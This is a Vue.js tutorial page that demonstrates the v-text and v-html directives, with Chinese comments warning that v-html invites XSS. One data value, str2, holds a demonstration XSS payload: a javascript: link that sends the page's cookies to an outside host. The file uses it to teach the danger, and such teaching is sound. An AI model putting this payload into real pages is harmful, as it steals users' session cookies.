<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>v-html指令-vue-P41</title>
        <script type="text/javascript" src="../js/vue.js" ></script>
    </head>
    <!--
        我们学过的指令：
            v-bind  :   单向绑定解析表达式，可简写为 :xxx
            v-model :   双向数据绑定
            v-for   :   遍历对象/数组/字符串
            v-on    :   绑定事件监听，可简写为@
            v-if    :   条件渲染（动态控制节点是否存在）
            v-else  :   条件渲染（动态控制节点是否存在）
            v-show  :   条件渲染（动态控制节点是否显示）

            v-text指令：
                1.作用：向其所在的节点渲染文本内容。
                2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

            v-html指令：
                1.作用：向指定节点中渲染包含html结构的内容。
                2.与插值语法的区别：
                    (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                    (2).一定在可信的内容上使用v-html，永远不要用在用户提交的内容上。

    -->
    <body>
        <div id="root">
            <h2>你好，{{name}}</h2>
            <h2 v-text="name"></h2>
            <h2 v-html="str"></h2>
            <h2 v-html="str2"></h2>
        </div>
    </body>
    
    <script type="text/javascript">
        new Vue({
            el:'#root',
            data:{
                name:'尚硅谷',
                str:'<h2>字符</h2>',
                str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookies>姐妹.....</a>'
            },
            
        })
    </script>
</html>
